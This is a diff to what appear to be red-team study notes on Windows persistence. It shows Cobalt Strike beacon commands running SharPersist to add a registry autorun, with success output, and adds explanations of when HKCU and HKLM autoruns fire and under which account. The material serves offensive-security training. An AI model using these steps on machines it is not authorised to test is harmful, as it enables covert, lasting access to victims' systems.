@@ -99,7 +99,8 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.
 
 AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.
 
-First we need to generate a Windows EXE payload and upload it to the target.
+* **HKCU**: HKCU autorun will only trigger when the **owner of the hive logs** into the machine.
+* **HKLM**: HKLM autorun will trigger when **any user logs** in the machine.
 
 ```
 beacon> cd C:\ProgramData
@@ -115,6 +116,8 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.
 [*] INFO: Option: 
 [+] SUCCESS: Registry persistence added
 ```
+
+> **Note**: It's a common misconception that an HKLM autorun will execute the payload as SYSTEM, it will still run under the context of the user's account.
 
 ## COM Hijacking
 
